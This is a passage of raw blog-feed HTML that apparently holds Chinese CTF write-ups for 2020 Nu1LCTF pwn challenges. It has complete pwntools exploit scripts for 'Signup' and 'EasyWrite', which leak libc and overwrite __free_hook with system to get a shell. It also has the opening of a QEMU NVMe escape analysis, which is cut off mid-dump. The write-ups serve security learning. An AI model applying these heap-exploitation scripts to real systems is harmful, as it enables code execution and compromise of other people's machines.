class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">ap</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;value[y/n]? &quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;alpha = &quot;</span>, <span class="built_in">str</span>(ap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">index, content=[], label=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to train? &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;to finish)\n&quot;</span>)</span><br><span class="line">    con_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        con_str += <span class="built_in">str</span>(i) + <span class="string">&quot; &quot;</span></span><br><span class="line">    p.sendline(con_str)</span><br><span class="line">    p.sendline(<span class="string">&quot;END&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;labels:&quot;</span>, <span class="built_in">str</span>(label))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;model to show? &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to remove?&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xa0</span>)</span><br><span class="line">train_content = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">train(<span class="number">0</span>, train_content, label=<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xa0</span>)</span><br><span class="line">create(<span class="number">0xa0</span>)</span><br><span class="line">train(<span class="number">2</span>, train_content, label=<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xa0</span>)</span><br><span class="line">train(<span class="number">1</span>, train_content, label=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">train_content = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x60</span>):</span><br><span class="line">    train_content.append(-<span class="number">1</span>)</span><br><span class="line">train(<span class="number">0</span>, train_content)</span><br><span class="line">train_content = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x50</span>-<span class="number">0x30</span>):</span><br><span class="line">    train_content.append(-<span class="number">1</span>)</span><br><span class="line">train(<span class="number">2</span>, train_content)</span><br><span class="line">train_content = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x13</span>):</span><br><span class="line">    payload += <span class="string">b&quot;3 &quot;</span></span><br><span class="line">payload= payload.ljust(<span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x71</span>) + p64(<span class="number">0xa0</span>) + p64(<span class="number">4</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;to train? &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;to finish)\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;END&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;labels:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Count of words for each label: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">heap_address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x471</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;to train? &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;to finish)\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;END&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;labels:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Count of words for each label: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>, drop=<span class="literal">True</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    create(<span class="number">0xa0</span>)</span><br><span class="line">create(<span class="number">0xa0</span>)  <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">    log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x71</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line"><span class="comment"># payload = payload.ljust(0x79, b&quot;\x00&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;to train? &quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;to finish)\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;END&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;labels:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">create(u64(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">create(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 Nu1LCTF 部分PWN WriteUp</title>
      <link href="/posts/2291042632.html"/>
      <url>/posts/2291042632.html</url>
      
        <content type="html"><![CDATA[<h2 id="Signup"><a href="#Signup" class="headerlink" title="Signup"></a>Signup</h2><p>程序实现了一种<code>vector</code>的实现。程序在<code>1,2,4,8,16...</code>申请新的堆块，拷贝数据，并释放旧的堆块。但是在进行删除<code>Delete</code>函数的时候没有对边界进行判断，导致我们可以进行无限次释放，从而将<code>vector-&gt;current</code>指针指向已经释放的<code>unsorted bin</code>的<code>fd</code>，从而泄露出<code>libc</code>基址。</p><p>泄露出<code>libc</code>基址之后，我们可以直接利用指针越界覆写<code>0x20</code>大小的堆块的<code>fd</code>指针，利用第二个<code>vector</code>覆写<code>free_hook</code>，释放带有<code>/bin/sh</code>的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./signin&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x11d2)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, number</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Number:&quot;</span>, <span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x800</span>/<span class="number">8</span>) + <span class="number">1</span>):</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x800</span>/<span class="number">8</span>)*<span class="number">2</span> + <span class="number">2</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline()) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x860</span>/<span class="number">8</span>) + <span class="number">1</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0x11d2)&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">add(<span class="number">1</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">2</span>, u64(<span class="string">&quot;/bin/sh\\x00&quot;</span>))</span><br><span class="line">add(<span class="number">2</span>, libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EasyWrite"><a href="#EasyWrite" class="headerlink" title="EasyWrite"></a>EasyWrite</h2><p>程序可以向任意地址写入堆的地址，之后释放了一个重新申请的<code>0x40</code>大小的堆块。这里主要的难点就是如何选取任意写的位置。从<code>WP</code>中我们知道，<code>libc</code>高地址处保存着一个<code>tcache</code>的指针。但是从源代码中看到<code>tcache</code>是一个全局变量，而从汇编代码中看到它保存在<code>fs:[0xffffffffffffffb0]</code>的位置，暂时不知道怎么查看这个值。猜测可能是<code>fs</code>在内存中的映射。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%20Nu1LCTF%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled.png" alt="2020%20Nu1LCTF%20%E9%83%A8%E5%88%86PWN%20WriteUp%206b5590616602455f9a4ceb31a0d92d2c/Untitled.png"></p><p>那么如果我们将<code>tcache</code>指向程序一开始分配的<code>0x300</code>大小的堆块，也就是说之后<code>tcache</code>的管理就从我们设置的堆块开始了，在其中伪造<code>0x40</code>大小堆块处的指针为<code>free_hook-0x10</code>，那么在之后就能够覆写<code>free_hook</code>，并在堆块的起始填入<code>/bin/sh</code>。释放该堆块即可<code>getsell</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easywrite&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(0x12c4)&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Here is your gift:&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\\n&quot;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">fake_tcache_pthread_struct = p32(<span class="number">0</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">fake_tcache_pthread_struct += p64(<span class="number">0</span>) * <span class="built_in">int</span>((<span class="number">0x410</span>-<span class="number">0x20</span> + <span class="number">0x10</span>)/(<span class="number">8</span> * <span class="number">8</span>) - <span class="number">1</span>)</span><br><span class="line">fake_tcache_pthread_struct += p64(<span class="number">0</span>)* <span class="number">2</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;message:&quot;</span>, fake_tcache_pthread_struct)</span><br><span class="line">p.sendafter(<span class="string">&quot;to write?:&quot;</span>, p64(libc.address + <span class="number">0x1f34f0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;message?:&quot;</span>, <span class="string">b&quot;/bin/sh\\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="kemu"><a href="#kemu" class="headerlink" title="kemu"></a>kemu</h2><p><code>qemu逃逸</code></p><p>没有符号表，首先我们看一下启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pwd</span>=`<span class="built_in">pwd</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">#./qemu-system-x86_64 \\</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 600 <span class="variable">$&#123;pwd&#125;</span>/qemu-system-x86_64 \\</span><br><span class="line">        -initrd <span class="variable">$&#123;pwd&#125;</span>/rootfs.img -nographic -kernel <span class="variable">$&#123;pwd&#125;</span>/kernel-guest \\</span><br><span class="line">        -L <span class="variable">$&#123;pwd&#125;</span>/pc-bios -append <span class="string">&quot;priority=low console=ttyS0 loglevel=3 kaslr&quot;</span> \\</span><br><span class="line">        -drive file=<span class="variable">$&#123;pwd&#125;</span>/nvme.raw,format=raw,<span class="keyword">if</span>=none,<span class="built_in">id</span>=Dxx -device nvme,drive=Dxx,serial=1234 \\</span><br><span class="line">        -monitor /dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这里直接加了<code>nvme</code>的<code>device</code>。但是程序没有符号表，因此这里我们搜索一下字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__fastcall <span class="title function_">nvme_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> **result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = (_QWORD *)sub_5C5EA0(a1, <span class="string">&quot;device&quot;</span>, <span class="string">&quot;hw/block/nvme.c&quot;</span>, <span class="number">1363LL</span>, <span class="string">&quot;nvme_class_init&quot;</span>);</span><br><span class="line">  v2 = sub_5C5EA0(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;hw/block/nvme.c&quot;</span>, <span class="number">1364LL</span>, <span class="string">&quot;nvme_class_init&quot;</span>);</span><br><span class="line">  *(_DWORD *)(v2 + <span class="number">208</span>) = <span class="number">0x58458086</span>;</span><br><span class="line">  *(_BYTE *)(v2 + <span class="number">212</span>) = <span class="number">2</span>;</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">176</span>) = nvme_realize;</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">184</span>) = nvme_exit;</span><br><span class="line">  *(_WORD *)(v2 + <span class="number">214</span>) = <span class="number">0x108</span>;</span><br><span class="line">  v1[<span class="number">12</span>] |= <span class="number">4uLL</span>;</span><br><span class="line">  v1[<span class="number">14</span>] = <span class="string">&quot;Non-Volatile Memory Express&quot;</span>;</span><br><span class="line">  v1[<span class="number">15</span>] = &amp;off_F326E0;</span><br><span class="line">  result = &amp;off_D749C0;</span><br><span class="line">  v1[<span class="number">20</span>] = &amp;off_D749C0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到<code>0x58458086</code>和<code>0x108</code>这两个字符串，也就是说这里的<code>vendor_id</code>是<code>0x8086</code>，<code>deviceid</code>就是<code>0x5845</code>，这里的<code>0x108</code>指的是设备的类型。我们看一下<code>lspci</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0108: 8086:5845</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从这里的<code>id</code>我们可以看到是<code>00:04.0</code>这个设备，看一下<code>resource</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># cat /sys/devices/pci0000\\:00/0000\\:00\\:04.0/resource</span></span><br><span class="line">0x00000000febf0000 0x00000000febf1fff 0x0000000000140204</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febf3000 0x00000000febf3fff 0x0000000000040200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里存在两个内存空间。因此这里我们看一下<code>nvme_realize</code>函数。对照源码，我们可以识别出一些函数。需要注意的是这里的源码需要对应<code>qemu</code>的版本，这里的版本是<code>4.0.0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(v11 + <span class="number">2928</span>, v11, nvme_mmio_ops, v11, <span class="string">&quot;nvme&quot;</span>, v26);</span><br><span class="line">pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">4LL</span>, v11 + <span class="number">2928</span>);</span><br><span class="line">msix_init_exclusive_bar(a1, *(<span class="type">unsigned</span> __int16 *)(v11 + <span class="number">3548</span>), <span class="number">4LL</span>, <span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ( v29 )</span><br><span class="line">&#123;</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    v11 + <span class="number">3168</span>,</span><br><span class="line">    v11,</span><br><span class="line">    nvme_cmb_ops,</span><br><span class="line">    v11,</span><br><span class="line">    <span class="string">&quot;nvme-cmb&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v11 + <span class="number">3468</span>) &gt;&gt; <span class="number">12</span> &lt;&lt; (<span class="number">4</span> * (BYTE1(*(_DWORD *)(v11 + <span class="number">3468</span>)) &amp; <span class="number">0xF</span>) + <span class="number">12</span>)));</span><br><span class="line">  result = pci_register_bar(a1, *(_DWORD *)(v11 + <span class="number">3464</span>) &amp; <span class="number">7</span>, <span class="number">12LL</span>, v11 + <span class="number">3168</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从这一层的代码来看，这里的两个内存空间来自于<code>nvme,nvme-cmd</code>这两个。但是在调试过程中发现，这里的<code>if</code>循环根本就不会进入，因此第二个内存空间就不是<code>nvme-cmb</code>的。那么我们在<code>realize</code>和<code>memory_region_init_io</code>函数下断点。那么从<code>realize</code>进入之后，第一次断点就是<code>nvme</code>的内存空间的注册了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x55555719ebf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RCX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x555556174a80</span> —▸ <span class="number">0x55555585de20</span> ◂— push   r14</span><br><span class="line">*RDI  <span class="number">0x555557195e50</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSI  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span 